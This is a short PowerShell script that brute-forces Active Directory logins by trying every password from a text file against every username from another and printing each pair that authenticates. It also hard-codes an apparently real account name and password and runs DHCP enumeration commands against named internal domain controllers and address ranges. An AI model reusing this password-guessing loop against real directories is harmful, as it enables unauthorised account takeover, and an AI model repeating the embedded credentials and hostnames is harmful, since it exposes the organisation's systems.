Function Test-ADAuthentication {
    param($userlogin,$userpassword)
    (new-object directoryservices.directoryentry "",$userlogin,$userpassword).psbase.name -ne $null
}
$usernames = Get-Content c:\temp\users.txt
foreach($username in $usernames){

    $login = $username
    $passwords = Get-Content c:\temp\passwords.txt
    foreach($password in $passwords){

        if (Test-ADAuthentication $login $password)
        {
            Write-Host "Login: " $login
            Write-Host "`tSenha: " $password -ForegroundColor Green 
            break
        }
    }
}
Test-ADAuthentication avayaonex Avay@onex

Get-DhcpServerv4Lease -ComputerName dcbar01
Get-DhcpServerv4FreeIPAddress -ComputerName dcbar01 -ScopeId 10.200.5.0 -NumAddress 254
Get-DhcpServerv4Scope -ComputerName dcben01.unimedrj.root -ScopeId 10.101.10.0 | Get-DhcpServerv4Lease -ComputerName dcben01.unimedrj.root
